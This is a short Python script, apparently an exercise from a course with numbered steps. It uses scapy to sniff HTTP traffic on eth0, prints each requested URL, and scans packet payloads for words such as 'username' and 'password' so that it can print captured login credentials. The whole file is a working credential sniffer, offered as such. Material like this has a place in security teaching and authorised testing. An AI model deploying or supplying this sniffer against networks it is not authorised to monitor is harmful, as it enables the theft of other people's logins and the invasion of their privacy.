#!usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


# step 1
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# step 7 cleanup a bit
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # step 5


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # added str for Python 3
        # skipped some steps but this is maybe 4...adding keywords to search in for loop
        keywords = ["username", "uname", "name", "login", "pass", "password", "word"]
        for keyword in keywords:
            if keyword in load:
                return load


# step 2 is adding http scapy filter. packet.haslayer to search the results.
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())  # this was the change to str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password> " + login_info + "\n\n")


sniff("eth0")


# step 5 is extracting URLs
# access HTTP layer then print host and path
